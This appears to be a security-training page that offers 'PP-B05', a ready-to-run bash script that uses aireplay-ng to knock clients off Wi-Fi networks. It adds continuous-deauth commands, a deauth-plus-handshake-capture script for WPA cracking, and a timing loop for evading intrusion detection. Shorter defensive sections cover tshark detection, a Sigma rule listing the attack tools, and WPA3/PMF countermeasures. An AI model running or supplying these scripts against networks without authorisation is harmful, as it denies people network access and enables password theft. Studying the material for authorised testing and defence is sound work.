# PP-B05: Deauth Test

## Overview

| Property | Value |
|----------|-------|
| **ID** | PP-B05 |
| **Name** | Deauth Test |
| **Difficulty** | Basic |
| **Type** | Test |
| **Purpose** | Send test deauthentication packets |
| **MITRE ATT&CK** | T1498 (Network Denial of Service) |

## What This Payload Does

Sends targeted deauthentication packets to disconnect a client from a wireless network. This is commonly used to force handshake captures or deny network access.

---

## Understanding Deauthentication

```
┌─────────────────────────────────────────────────────────────┐
│              DEAUTHENTICATION ATTACK                        │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   ATTACKER              CLIENT              ACCESS POINT    │
│       │                   │                      │          │
│       │                   │◄─────Connected──────►│          │
│       │                   │                      │          │
│       │──Deauth Frame────►│                      │          │
│       │ (Spoofed as AP)   │                      │          │
│       │                   │                      │          │
│       │                   │──Deauth Frame───────►│          │
│       │                   │ (Spoofed as Client)  │          │
│       │                   │                      │          │
│       │                   │   DISCONNECTED!      │          │
│       │                   │                      │          │
│       │                   │──Reconnect Attempt──►│          │
│       │   [CAPTURE]◄──────│◄────Handshake───────►│          │
│       │                   │                      │          │
│                                                              │
│   WHY IT WORKS:                                             │
│   • Deauth frames are unencrypted management frames         │
│   • No authentication required to send them                 │
│   • Clients trust deauth from any source                    │
│   • Fixed in WPA3 with Protected Management Frames (PMF)    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## The Payload

```bash
#!/bin/bash
#
# Payload: PP-B05
# Name: Deauth Test
# Description: Send targeted deauthentication packets
# Author: Security Training
# WARNING: Only use on networks you own or have permission to test!
#

# ============================================
# CONFIGURATION
# ============================================
INTERFACE="wlan1"
TARGET_BSSID=""              # AP MAC (required)
TARGET_CLIENT=""             # Client MAC (optional, empty = broadcast)
DEAUTH_COUNT=5               # Number of deauths (0 = continuous)
CHANNEL=""                   # Channel (auto-detect if empty)

# ============================================
# SETUP
# ============================================
LOG_FILE="/tmp/pp-b05.log"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

usage() {
    echo "Usage: $0 -b <BSSID> [-c <client>] [-n <count>] [-C <channel>]"
    echo ""
    echo "Options:"
    echo "  -b    Target AP BSSID (required)"
    echo "  -c    Target client MAC (optional, broadcast if empty)"
    echo "  -n    Number of deauths (default: 5, 0 for continuous)"
    echo "  -C    Channel (auto-detect if not specified)"
    echo ""
    echo "Example:"
    echo "  $0 -b AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 -n 10"
    exit 1
}

cleanup() {
    log "Cleaning up..."
    airmon-ng stop "${INTERFACE}mon" 2>/dev/null
    exit 0
}

trap cleanup SIGINT SIGTERM

# ============================================
# PARSE ARGUMENTS
# ============================================
while getopts "b:c:n:C:h" opt; do
    case $opt in
        b) TARGET_BSSID="$OPTARG" ;;
        c) TARGET_CLIENT="$OPTARG" ;;
        n) DEAUTH_COUNT="$OPTARG" ;;
        C) CHANNEL="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

# Validate required arguments
if [ -z "$TARGET_BSSID" ]; then
    log "ERROR: Target BSSID is required"
    usage
fi

# Validate MAC format
validate_mac() {
    echo "$1" | grep -qE "^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$"
}

if ! validate_mac "$TARGET_BSSID"; then
    log "ERROR: Invalid BSSID format"
    exit 1
fi

if [ -n "$TARGET_CLIENT" ] && ! validate_mac "$TARGET_CLIENT"; then
    log "ERROR: Invalid client MAC format"
    exit 1
fi

# ============================================
# INITIALIZATION
# ============================================
log "Starting PP-B05: Deauth Test"
log "Target AP: $TARGET_BSSID"
log "Target Client: ${TARGET_CLIENT:-Broadcast (all clients)}"
log "Deauth Count: ${DEAUTH_COUNT:-Continuous}"

# Check for required tools
command -v aireplay-ng >/dev/null 2>&1 || {
    log "ERROR: aireplay-ng not found"
    exit 1
}

# ============================================
# ENABLE MONITOR MODE
# ============================================
log "Enabling monitor mode..."

airmon-ng check kill 2>/dev/null
airmon-ng start "$INTERFACE" 2>/dev/null

if ip link show "${INTERFACE}mon" >/dev/null 2>&1; then
    MON_INTERFACE="${INTERFACE}mon"
else
    MON_INTERFACE="${INTERFACE}"
fi

log "Monitor interface: $MON_INTERFACE"

# ============================================
# AUTO-DETECT CHANNEL
# ============================================
if [ -z "$CHANNEL" ]; then
    log "Auto-detecting channel for $TARGET_BSSID..."

    # Quick scan to find channel
    timeout 10 airodump-ng --bssid "$TARGET_BSSID" \
        --write /tmp/deauth_scan -o csv "$MON_INTERFACE" &
    sleep 8
    pkill -f airodump-ng 2>/dev/null

    if [ -f /tmp/deauth_scan-01.csv ]; then
        CHANNEL=$(grep "$TARGET_BSSID" /tmp/deauth_scan-01.csv | cut -d',' -f4 | tr -d ' ' | head -1)
        rm -f /tmp/deauth_scan*
    fi

    if [ -z "$CHANNEL" ]; then
        log "ERROR: Could not detect channel. Specify with -C"
        cleanup
        exit 1
    fi
fi

log "Using channel: $CHANNEL"

# ============================================
# SET CHANNEL
# ============================================
iwconfig "$MON_INTERFACE" channel "$CHANNEL" 2>/dev/null || \
    iw dev "$MON_INTERFACE" set channel "$CHANNEL" 2>/dev/null

# Verify channel
CURRENT_CH=$(iw dev "$MON_INTERFACE" info | grep channel | awk '{print $2}')
log "Confirmed on channel: $CURRENT_CH"

# ============================================
# SEND DEAUTH
# ============================================
log "Sending deauthentication packets..."

if [ -n "$TARGET_CLIENT" ]; then
    # Targeted deauth
    log "Mode: Targeted (specific client)"
    aireplay-ng --deauth "$DEAUTH_COUNT" \
        -a "$TARGET_BSSID" \
        -c "$TARGET_CLIENT" \
        "$MON_INTERFACE"
else
    # Broadcast deauth
    log "Mode: Broadcast (all clients)"
    aireplay-ng --deauth "$DEAUTH_COUNT" \
        -a "$TARGET_BSSID" \
        "$MON_INTERFACE"
fi

RESULT=$?

if [ $RESULT -eq 0 ]; then
    log "Deauthentication complete!"
else
    log "Deauthentication failed (code: $RESULT)"
fi

# ============================================
# CLEANUP
# ============================================
cleanup
```

---

## Line-by-Line Breakdown

### MAC Address Validation
```bash
validate_mac() {
    echo "$1" | grep -qE "^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$"
}
```
Regex breakdown:
- `^` - Start of string
- `([0-9A-Fa-f]{2}:){5}` - Five groups of two hex chars followed by colon
- `[0-9A-Fa-f]{2}$` - Final two hex chars at end

### Channel Auto-Detection
```bash
timeout 10 airodump-ng --bssid "$TARGET_BSSID" ...
```
- Scans specifically for target AP
- `timeout 10` kills after 10 seconds
- Extracts channel from CSV output

### Deauth Command
```bash
aireplay-ng --deauth "$DEAUTH_COUNT" -a "$TARGET_BSSID" -c "$TARGET_CLIENT"
```
| Option | Purpose |
|--------|---------|
| `--deauth N` | Number of deauth packets (0 = continuous) |
| `-a` | Target access point BSSID |
| `-c` | Target client (omit for broadcast) |

---

## Deauth Modes

### Mode 1: Broadcast Deauth
```bash
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan1mon
```
- Disconnects ALL clients from AP
- More disruptive but guaranteed to work
- Sends both directions (client→AP and AP→client)

### Mode 2: Targeted Deauth
```bash
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan1mon
```
- Disconnects specific client only
- Less detectable
- Requires knowing client MAC

### Mode 3: Continuous Deauth
```bash
aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan1mon
```
- Runs until stopped (Ctrl+C)
- Effective denial of service
- Very noticeable

---

## Why Deauth Works

### 802.11 Management Frames
```
802.11 Frame Types:
├── Management Frames (Type 0)
│   ├── Subtype 0x00: Association Request
│   ├── Subtype 0x01: Association Response
│   ├── Subtype 0x04: Probe Request
│   ├── Subtype 0x05: Probe Response
│   ├── Subtype 0x08: Beacon
│   ├── Subtype 0x0A: Disassociation
│   └── Subtype 0x0C: Deauthentication  ← THIS ONE
├── Control Frames (Type 1)
└── Data Frames (Type 2)
```

**Key Point**: Management frames are NOT encrypted in WPA/WPA2, making them spoofable.

### Protected Management Frames (PMF)
```
WPA3 / 802.11w:
- Management frames are encrypted
- Deauth attacks no longer work
- Must be enabled on both AP and client
- Look for "MFPR" (Management Frame Protection Required)
```

---

## Combining with Handshake Capture

```bash
#!/bin/bash
# Deauth + Capture combo

TARGET_AP="AA:BB:CC:DD:EE:FF"
CHANNEL="6"

# Start capture
airodump-ng -c $CHANNEL --bssid $TARGET_AP \
    --write /tmp/capture wlan1mon &
CAPTURE_PID=$!

# Wait for capture to start
sleep 5

# Send deauth
aireplay-ng --deauth 5 -a $TARGET_AP wlan1mon

# Wait for reconnect
sleep 10

# Stop capture
kill $CAPTURE_PID

# Check for handshake
if aircrack-ng /tmp/capture-01.cap 2>/dev/null | grep -q "handshake"; then
    echo "SUCCESS: Handshake captured!"
else
    echo "No handshake captured, try again"
fi
```

---

## Red Team Perspective

### Use Cases
1. **Handshake capture** - Force reconnection for WPA crack
2. **Evil Twin setup** - Disconnect from real AP, connect to fake
3. **Denial of Service** - Continuous deauth prevents usage
4. **Targeted disruption** - Kick specific user off network

### OPSEC Considerations
- Deauth is VERY detectable by WIDS
- Use targeted mode when possible
- Minimum packets needed
- Don't run continuously in sensitive environments
- Consider timing (during high traffic periods)

### Avoiding Detection
```bash
# Randomize timing between bursts
for i in {1..10}; do
    aireplay-ng --deauth 3 -a $TARGET $MON_INTERFACE
    sleep $((RANDOM % 30 + 10))  # 10-40 second delay
done
```

---

## Blue Team Perspective

### Detection Methods

```bash
# Detect deauth frames with tshark
tshark -i wlan0 -Y "wlan.fc.type_subtype == 0x0c" -c 50

# Count deauths per minute (high count = attack)
watch -n 60 "tshark -i wlan0 -Y 'wlan.fc.type_subtype == 0x0c' -c 0 -a duration:60 2>/dev/null | wc -l"
```

### WIDS Alerts
Most Wireless Intrusion Detection Systems alert on:
- High volume of deauth frames
- Deauths from unknown sources
- Deauths outside normal patterns

### Sigma Rule
```yaml
title: Wireless Deauthentication Attack
status: experimental
description: Detects potential deauth attack tools
logsource:
    product: linux
    service: syslog
detection:
    selection_tools:
        - 'aireplay-ng'
        - 'mdk3'
        - 'mdk4'
        - '--deauth'
    condition: selection_tools
level: high
tags:
    - attack.impact
    - attack.t1498
```

### Countermeasures
1. **Enable PMF (802.11w)** - Encrypts management frames
2. **Use WPA3** - PMF is mandatory
3. **Deploy WIDS** - Detect and alert on attacks
4. **Client settings** - Some clients can ignore deauths
5. **Wired alternatives** - Critical systems on ethernet

---

## Legal Warning

```
╔══════════════════════════════════════════════════════════════╗
║                         WARNING                               ║
╠══════════════════════════════════════════════════════════════╣
║  Sending deauthentication packets to networks you don't      ║
║  own or have explicit permission to test is ILLEGAL in       ║
║  most jurisdictions.                                          ║
║                                                                ║
║  Violations may include:                                      ║
║  • Computer Fraud and Abuse Act (US)                          ║
║  • Computer Misuse Act (UK)                                   ║
║  • Similar laws in other countries                            ║
║                                                                ║
║  ALWAYS get written authorization before testing.             ║
╚══════════════════════════════════════════════════════════════╝
```

---

## Practice Exercises

### Exercise 1: Targeted Deauth Script
Create a script that finds clients of a target AP and deauths them one by one.

### Exercise 2: Deauth + Evil Twin
Combine deauth with an evil twin to capture clients.

### Exercise 3: Detection Script
Write a script that detects and alerts on deauth attacks.

---

## Payload File

Save as `PP-B05_Deauth_Test.sh`:

```bash
#!/bin/bash
# PP-B05: Deauth Test (Compact)
# Usage: ./PP-B05.sh <BSSID> [client] [count]
BSSID="${1:?Usage: $0 <BSSID> [client] [count]}"
CLIENT="$2"
COUNT="${3:-5}"
airmon-ng check kill && airmon-ng start wlan1
if [ -n "$CLIENT" ]; then
    aireplay-ng --deauth $COUNT -a "$BSSID" -c "$CLIENT" wlan1mon
else
    aireplay-ng --deauth $COUNT -a "$BSSID" wlan1mon
fi
airmon-ng stop wlan1mon
```

---

[← PP-B04 Basic Scan](PP-B04_Basic_Scan.md) | [Back to Basic Payloads](README.md) | [Next: PP-B06 System Status →](PP-B06_System_Status.md)
